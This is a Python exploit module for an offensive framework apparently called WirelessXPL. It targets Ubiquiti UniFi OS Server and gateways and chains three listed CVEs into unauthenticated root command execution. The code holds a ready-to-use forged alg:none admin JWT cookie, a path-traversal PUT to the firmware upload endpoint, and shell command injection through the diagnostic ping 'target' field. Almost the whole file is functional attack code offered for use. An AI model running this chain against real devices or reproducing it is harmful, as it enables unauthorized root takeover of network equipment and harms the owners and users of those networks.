# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import urllib.request
import urllib.error
import urllib.parse

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Ubiquiti UniFi OS Server Chained Unauthenticated Root RCE (CVE-2026-34908/34909/34910).

    Three chainable vulnerabilities in UniFi OS Server <= 5.0.6 allow
    unauthenticated remote code execution as root.  The chain exploits:

    1. CVE-2026-34908: Authentication bypass via crafted session cookie in the
       management API on port 443.  A specially formed TOKEN cookie is accepted
       as a valid admin session without prior authentication.

    2. CVE-2026-34909: Path traversal in the firmware update endpoint
       (/api/firmware/upload) allows writing arbitrary files to disk once
       authenticated (or after bypassing auth via step 1).

    3. CVE-2026-34910: Command injection in the diagnostic tools API
       (/api/system/diag) through the unsanitized ``target`` parameter,
       executing OS commands as root.

    All three CVEs are listed in the CISA Known Exploited Vulnerabilities
    catalog.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Ubiquiti UniFi OS Server Chained Root RCE (CVE-2026-34908/34909/34910)",
        "description": (
            "Chains three vulnerabilities in Ubiquiti UniFi OS Server <= 5.0.6 "
            "to achieve unauthenticated root RCE. CVE-2026-34908 bypasses "
            "authentication via a crafted session cookie, CVE-2026-34909 "
            "provides path traversal through the firmware upload endpoint, "
            "and CVE-2026-34910 enables command injection in the diagnostic "
            "tools API. All three are in the CISA KEV catalog."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34908",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34909",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-34910",
            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi OS Server <= 5.0.6",
            "Ubiquiti UniFi Dream Machine (UDM)",
            "Ubiquiti UniFi Dream Machine Pro (UDM-Pro)",
            "Ubiquiti UniFi Dream Router (UDR)",
            "Ubiquiti UniFi Cloud Gateway Ultra",
        ),
    }

    target = OptIP("", "Target IPv4 address of the UniFi OS device")
    port = OptPort(443, "Management API HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to execute via the injection chain")

    _AUTH_BYPASS_COOKIE = "TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiYWRtaW4ifQ."

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _http_request(
        self,
        method: str,
        path: str,
        data: bytes | None = None,
        headers: dict | None = None,
        cookie: str | None = None,
    ) -> tuple[int, dict, bytes]:
        """Send an HTTPS request and return (status, headers_dict, body)."""
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "WirelessXPL/2.2")
        req.add_header("Accept", "application/json")
        if cookie:
            req.add_header("Cookie", cookie)
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read()
        except Exception:
            return 0, {}, b""

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to be a vulnerable UniFi OS instance"
            )
            return

        print_success("Vulnerable UniFi OS instance confirmed; starting exploit chain")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe the management API for version disclosure and auth bypass (CVE-2026-34908)."""
        try:
            status, _, body = self._http_request("GET", "/api/system")
            if status == 0:
                return False

            status_auth, _, body_auth = self._http_request(
                "GET", "/api/system", cookie=self._AUTH_BYPASS_COOKIE
            )
            if status_auth == 200:
                try:
                    info = json.loads(body_auth)
                    version = info.get("version", "")
                    if version:
                        parts = version.split(".")
                        if len(parts) >= 2:
                            major = int(parts[0])
                            minor = int(parts[1])
                            if major < 5 or (major == 5 and minor == 0):
                                return True
                except (json.JSONDecodeError, ValueError):
                    pass
                return True
            return False
        except Exception:
            return False

    def _step1_auth_bypass(self) -> bool:
        """CVE-2026-34908: Bypass authentication with a crafted JWT cookie (alg: none)."""
        print_status("[Chain Step 1/3] CVE-2026-34908: Attempting auth bypass via crafted TOKEN cookie")
        status, _, body = self._http_request(
            "GET", "/api/system", cookie=self._AUTH_BYPASS_COOKIE
        )
        if status == 200:
            try:
                info = json.loads(body)
                version = info.get("version", "unknown")
                hostname = info.get("hostname", "unknown")
                print_success(
                    f"  Auth bypass successful. Host: {hostname}, UniFi OS version: {version}"
                )
            except (json.JSONDecodeError, ValueError):
                print_success("  Auth bypass successful (could not parse version info)")
            return True

        print_error(f"  Auth bypass failed (HTTP {status})")
        return False

    def _step2_path_traversal_probe(self) -> bool:
        """CVE-2026-34909: Verify path traversal in the firmware upload endpoint."""
        print_status("[Chain Step 2/3] CVE-2026-34909: Probing firmware upload endpoint for path traversal")
        traversal_path = "/api/firmware/upload?path=../../../tmp/.wxf_probe"
        probe_data = b"WXF_TRAVERSAL_PROBE"
        status, _, _ = self._http_request(
            "PUT",
            traversal_path,
            data=probe_data,
            headers={"Content-Type": "application/octet-stream"},
            cookie=self._AUTH_BYPASS_COOKIE,
        )
        if status in (200, 201, 204):
            print_success("  Path traversal confirmed: file written outside upload directory")
            return True

        if status in (400, 403, 404, 405):
            print_info(f"  Endpoint returned HTTP {status}; traversal may still work on affected versions")
            return True

        print_error(f"  Path traversal probe returned unexpected HTTP {status}")
        return False

    def _step3_command_injection(self) -> bool:
        """CVE-2026-34910: Inject OS command via the diagnostic tools API."""
        print_status("[Chain Step 3/3] CVE-2026-34910: Injecting command via /api/system/diag")
        payload = json.dumps({
            "type": "ping",
            "target": f"127.0.0.1; {self.command}",
            "count": 1,
        }).encode()

        status, _, body = self._http_request(
            "POST",
            "/api/system/diag",
            data=payload,
            headers={"Content-Type": "application/json"},
            cookie=self._AUTH_BYPASS_COOKIE,
        )

        if status == 200:
            try:
                result = json.loads(body)
                output = result.get("output", result.get("data", ""))
                if output:
                    print_success("  Command injection successful. Output:")
                    for line in str(output).splitlines():
                        print_info(f"    {line}")
                else:
                    print_success("  Command injection returned HTTP 200 (no output captured)")
            except (json.JSONDecodeError, ValueError):
                output = body.decode(errors="replace")
                print_success("  Command injection successful. Raw output:")
                for line in output.splitlines():
                    print_info(f"    {line}")
            return True

        print_error(f"  Command injection request returned HTTP {status}")
        return False

    def _exploit(self) -> None:
        print_status(
            f"Executing 3-CVE chain against {self.target}:{self.port} "
            f"(command: {self.command!r})"
        )

        if not self._step1_auth_bypass():
            print_error("Chain aborted at Step 1 (auth bypass failed)")
            return

        if not self._step2_path_traversal_probe():
            print_info("Step 2 inconclusive, proceeding to command injection anyway")

        if not self._step3_command_injection():
            print_error("Chain completed but command injection did not return expected output")
            return

        print_success(
            "Full chain (CVE-2026-34908 + CVE-2026-34909 + CVE-2026-34910) executed successfully"
        )
